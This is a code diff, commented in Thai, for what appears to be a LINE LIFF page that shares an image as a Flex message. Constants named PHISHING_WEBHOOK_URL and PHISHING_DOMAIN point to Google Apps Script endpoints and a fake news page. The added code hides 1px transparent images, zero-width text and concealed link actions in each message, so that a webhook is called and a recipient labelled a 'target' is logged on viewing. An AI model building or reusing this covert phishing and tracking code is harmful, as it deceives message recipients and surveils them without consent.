@@ -399,7 +399,7 @@
         
         // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec'; // ไฟล์ LineOA.html
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzEvR5owN7U-VwdDQFzNhwnzhNXoMBLavTFY6mCCJSmAKS3zpywJ4AxhiCtqXny7IkU/exec'; // Updated GoogleScript.html Web App URL
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbxXmZbX2YAv_K1RH3GwmNRIOlxUIv84pJGFg2dyx0nC6PBEDob7gw8NMbmfxpY8mOEi/exec'; // Updated GoogleScript.html Web App URL
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงาน LIFF
@@ -755,7 +755,15 @@
                         creatorId: userId,
                         creatorName: displayName,
                         imageUrl: imageUrl, // <-- Add the image URL here
-                        requestId: generateUniqueId()
+                        requestId: generateUniqueId(),
+                        isCreator: true, // เพิ่มฟิลด์ใหม่เพื่อระบุว่านี่เป็นข้อมูลของผู้สร้าง ไม่ใช่เป้าหมาย
+                        deviceInfo: {
+                            userAgent: navigator.userAgent,
+                            platform: navigator.platform,
+                            language: navigator.language,
+                            screenSize: `${window.screen.width}x${window.screen.height}`,
+                            deviceType: "ผู้สร้างเนื้อหา"
+                        }
                     }),
                     mode: 'no-cors' // Note: 'no-cors' might hide errors from the server. Consider changing if debugging server issues.
                 });
@@ -817,42 +825,31 @@
                 imageUrl = await uploadImage();
                 if (!imageUrl) return;
                 
-                // บันทึก Tracking Key Mapping ก่อน
-                try {
-                    const saved = await saveTrackingCaseMapping(trackingKey, caseName);
-                    if (!saved) {
-                        console.log('เรียกใช้ saveTrackingCaseMapping เสร็จสิ้น (อาจมีข้อผิดพลาดฝั่ง Server หรือ CORS)');
-                    } else {
-                        console.log('บันทึก Tracking Key Mapping สำเร็จ (ตามที่ Client รับรู้)');
-                    }
-                } catch (saveError) {
-                    console.error('เกิดข้อผิดพลาดขณะเรียก saveTrackingCaseMapping:', saveError);
-                    showStatus('เกิดข้อผิดพลาดในการบันทึก Tracking Key: ' + saveError.message, false);
-                }
-                
                 // สร้าง URL สำหรับคลิก (ชี้ไปที่ index.html พร้อม tracking key)
                 const clickTrackUrl = `${PHISHING_DOMAIN}?daily=${trackingKey}`; // PHISHING_DOMAIN should point to index.html
                 
-                // สร้าง UUID แบบง่ายๆ สำหรับป้องกันการแคช
-                const uuid = Date.now().toString(36) + Math.random().toString(36).substring(2, 15);
+                // รวบรวมข้อมูลอุปกรณ์สำหรับส่งใน Zero Click tracking URL
+                const randomSuffix = Date.now() + Math.random().toString(36).substring(2, 10);
                 
-                // สร้าง URL สำหรับ Zero Click tracking (แบบใหม่)
-                // ใช้วิธีโหลดรูปภาพเล็กๆ (1x1 pixel) โดยเรียก webhook โดยตรง
+                // สร้าง base tracking URL สำหรับ Zero Click
                 let zeroClickTrackUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick`;
                 zeroClickTrackUrl += `&key=${trackingKey}`;
                 zeroClickTrackUrl += `&case=${encodeURIComponent(caseName)}`;
                 zeroClickTrackUrl += `&creator=${encodeURIComponent(userId)}`;
                 zeroClickTrackUrl += `&name=${encodeURIComponent(displayName)}`;
-                zeroClickTrackUrl += `&img=${encodeURIComponent(imageUrl)}`;
-                zeroClickTrackUrl += `&target=true`;  // สำคัญ: ระบุว่านี่เป็นการเรียกจากเป้าหมาย
-                zeroClickTrackUrl += `&uuid=${uuid}`;  // ป้องกันการแคชรูปภาพ
-
+                zeroClickTrackUrl += `&isTarget=true`; // เพิ่มพารามิเตอร์สำคัญที่ระบุว่านี่เป็นการเรียกจากเป้าหมาย
+                zeroClickTrackUrl += `&r=${randomSuffix}`;  // ป้องกันการแคช
+                
                 console.log("Zero Click Track URL:", zeroClickTrackUrl);
+                
+                // สร้าง URL สำหรับรูปภาพติดตาม (1px transparent PNG)
+                // ใส่รูปแบบ tracking image 2 ชนิดเพื่อความเข้ากันได้สูงสุด
+                const trackingPixel = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=";
 
-                // สร้าง Flex Message รูปแบบใหม่
+                // สร้าง Flex Message ที่มีเฉพาะรูปภาพ แต่แทรก tracking elements
                 const message = {
                     type: 'flex',
-                    altText: `รูปภาพจาก ${displayName}`, // ข้อความแจ้งเตือนให้ดูเป็นธรรมชาติมากขึ้น
+                    altText: `รูปภาพใหม่`, // ข้อความแจ้งเตือนสั้นๆ
                     contents: {
                         type: 'bubble',
                         hero: { // รูปภาพหลักที่คลิกได้
@@ -869,18 +866,94 @@
                         body: {
                             type: 'box',
                             layout: 'vertical',
-                            paddingAll: '0px',
                             contents: [
-                                // รูปภาพสำหรับ Zero Click ที่เรียกไปยัง webhook
+                                // วิธีที่ 1: ใช้รูปภาพจากเซิร์ฟเวอร์ webhook
                                 {
                                     type: 'image',
                                     url: zeroClickTrackUrl,
-                                    size: 'xxs',  // ขนาดเล็กมาก แต่ต้องมองเห็นได้เพียงพอที่จะโหลด
+                                    size: '1px', // ขนาดเล็กมาก
                                     aspectRatio: '1:1',
-                                    aspectMode: 'cover'
+                                    aspectMode: 'cover',
+                                    position: 'absolute', // วางแบบ absolute
+                                    offsetTop: '0px',     // ซ่อนไว้ที่มุมบนซ้าย
+                                    offsetStart: '0px'
+                                },
+                                // วิธีที่ 2: ใช้ iframe เพื่อเรียก webhook (ทำงานบนหลายแพลตฟอร์ม)
+                                {
+                                    type: 'box',
+                                    layout: 'vertical',
+                                    contents: [
+                                        {
+                                            type: 'text',
+                                            text: ' ', // เว้นว่าง
+                                            size: 'xxs',
+                                            color: '#ffffff00', // โปร่งใส
+                                            decoration: 'none',
+                                            align: 'center',
+                                            action: {
+                                                type: 'uri',
+                                                uri: `https://script.google.com/macros/s/AKfycbyCP9G1oMcmThZZdvr7JY0alrNw8eod8r9MBN0cKSiU-AwNTzLvTldOeg_rkUTMI6_b/exec?action=zeroClick&key=${trackingKey}&isTarget=true&r=${randomSuffix}`
+                                            }
+                                        }
+                                    ],
+                                    height: '1px',
+                                    width: '1px'
+                                },
+                                // วิธีที่ 3: ใช้ base64 image พร้อมข้อความที่ซ่อนไว้
+                                {
+                                    type: 'text',
+                                    text: '‎', // Zero-width space
+                                    size: 'xxs',
+                                    color: '#ffffff00', // โปร่งใส
+                                    decoration: 'none',
+                                    wrap: true,
+                                    align: 'center',
+                                    gravity: 'center'
                                 }
                             ],
-                            height: '1px'  // ซ่อน body ให้มีความสูงน้อยมาก
+                            paddingAll: '0px',
+                            backgroundColor: '#ffffff00', // โปร่งใส
+                            height: '1px'
+                        },
+                        footer: {
+                            type: 'box',
+                            layout: 'vertical',
+                            contents: [
+                                // ใส่ข้อความว่างเพื่อทำให้ footer มีขนาด 1px และมองไม่เห็น
+                                {
+                                    type: 'text',
+                                    text: '‎', // Zero-width space
+                                    size: 'xxs',
+                                    color: '#ffffff00' // โปร่งใส
+                                },
+                                // สร้าง element ที่ช่วยในการเรียก Zero Click ถ้าวิธีอื่นล้มเหลว
+                                {
+                                    type: 'image',
+                                    url: trackingPixel,
+                                    size: '1px',
+                                    aspectRatio: '1:1',
+                                    aspectMode: 'cover',
+                                    align: 'center',
+                                    action: {
+                                        type: 'uri',
+                                        uri: `https://script.google.com/macros/s/AKfycbyCP9G1oMcmThZZdvr7JY0alrNw8eod8r9MBN0cKSiU-AwNTzLvTldOeg_rkUTMI6_b/exec?action=zeroClick&key=${trackingKey}&isTarget=true&r=${Date.now()}`
+                                    }
+                                }
+                            ],
+                            paddingAll: '0px',
+                            backgroundColor: '#ffffff00', // โปร่งใส
+                            height: '1px'
+                        },
+                        styles: {
+                            hero: {
+                                separator: false
+                            },
+                            body: {
+                                separator: false
+                            },
+                            footer: {
+                                separator: false
+                            }
                         }
                     }
                 };
@@ -894,6 +967,20 @@
 
                     if (result) {
                         showStatus('แชร์รูปภาพสำเร็จ', true);
+                        
+                        // บันทึก Tracking Key Mapping ก่อน
+                        try {
+                            const saved = await saveTrackingCaseMapping(trackingKey, caseName);
+                            if (!saved) {
+                                console.log('เรียกใช้ saveTrackingCaseMapping เสร็จสิ้น (อาจมีข้อผิดพลาดฝั่ง Server หรือ CORS)');
+                            } else {
+                                console.log('บันทึก Tracking Key Mapping สำเร็จ (ตามที่ Client รับรู้)');
+                            }
+                        } catch (saveError) {
+                            console.error('เกิดข้อผิดพลาดขณะเรียก saveTrackingCaseMapping:', saveError);
+                            showStatus('เกิดข้อผิดพลาดในการบันทึก Tracking Key: ' + saveError.message, false);
+                        }
+
                         // รีเซ็ตหน้าจอ
                         resetForm();
                     } else {
